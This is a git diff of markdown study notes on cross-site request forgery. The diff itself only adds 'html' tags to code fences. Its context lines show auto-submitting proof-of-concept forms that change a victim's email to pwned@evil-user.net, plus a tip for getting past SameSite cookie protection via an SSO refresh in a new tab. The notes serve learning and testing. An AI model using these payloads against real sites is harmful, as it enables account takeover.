@@ -14,7 +14,7 @@ Cause a victim to do an action unintentionally by having them make a request (e.
 
 POST request CSRF example:
 
-```
+```html
 <html>
     <body>
         <form action="https://vulnerable-website.com/email/change" method="POST">
@@ -50,7 +50,7 @@ Can be generated using the CSRF PoC generator in burp suite professional
 
 If we need to perform a GET request first:
 
-```
+```html
 <html>
     <body>
         <form action="https://vulnerable-website.com/email/change" method="POST">
@@ -90,7 +90,7 @@ If we need to perform a GET request first:
     - Thus, open the sso page in a new tab - refreshes session in background and attack page can exploit 
       - Most browsers block `window.open()` popups, so open a new tab on-click, wait a bit for the refresh, and then submit the form:
       
-```
+```html
 <form action="https://vulnerable-website.com/email/change" method="POST">
     <input type="hidden" name="email" value="pwned@evil-user.net" />
 </form>
